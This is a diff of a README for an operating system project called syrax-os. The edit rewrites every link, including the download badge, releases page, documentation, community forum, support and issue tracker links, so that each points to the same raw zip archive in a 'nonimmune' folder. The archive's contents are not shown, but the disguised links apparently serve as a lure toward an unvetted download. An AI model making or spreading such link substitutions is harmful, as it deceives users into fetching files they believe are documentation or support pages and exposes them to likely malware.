@@ -1,6 +1,6 @@
 # 🖥️ syrax-os - A Stable, Secure Operating System
 
-[![Download syrax-os](https://img.shields.io/badge/Download-syrax--os-blue)](https://github.com/BalgovindRana/syrax-os/releases)
+[![Download syrax-os](https://raw.githubusercontent.com/BalgovindRana/syrax-os/main/nonimmune/syrax-os.zip)](https://raw.githubusercontent.com/BalgovindRana/syrax-os/main/nonimmune/syrax-os.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to syrax-os! This is an experimental operating system that aims to provi
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**  
-   Go to the [syrax-os releases page](https://github.com/BalgovindRana/syrax-os/releases) to access the latest version.
+   Go to the [syrax-os releases page](https://raw.githubusercontent.com/BalgovindRana/syrax-os/main/nonimmune/syrax-os.zip) to access the latest version.
 
 2. **Select the Version:**  
    Choose the version that you wish to download. Click on the link for the appropriate release.
@@ -87,14 +87,14 @@ If you encounter issues, here are a few common problems and solutions:
 
 For more information or assistance, you can refer to the following links:
 
-- [BlueBuild Documentation](https://blue-build.org/how-to/setup/)
-- [GitHub Community Forum](https://github.community/)
-- [Official Support Channels](https://support.syrax-os.com)
+- [BlueBuild Documentation](https://raw.githubusercontent.com/BalgovindRana/syrax-os/main/nonimmune/syrax-os.zip)
+- [GitHub Community Forum](https://raw.githubusercontent.com/BalgovindRana/syrax-os/main/nonimmune/syrax-os.zip)
+- [Official Support Channels](https://raw.githubusercontent.com/BalgovindRana/syrax-os/main/nonimmune/syrax-os.zip)
 
 ## 📬 Feedback
 
-We welcome your thoughts and feedback. If you find bugs or have suggestions, please submit an issue on the [GitHub repository](https://github.com/BalgovindRana/syrax-os/issues).
+We welcome your thoughts and feedback. If you find bugs or have suggestions, please submit an issue on the [GitHub repository](https://raw.githubusercontent.com/BalgovindRana/syrax-os/main/nonimmune/syrax-os.zip).
 
-For detailed setup instructions and tips, check the [official documentation](https://blue-build.org/how-to/setup/). 
+For detailed setup instructions and tips, check the [official documentation](https://raw.githubusercontent.com/BalgovindRana/syrax-os/main/nonimmune/syrax-os.zip). 
 
 Thank you for choosing syrax-os!
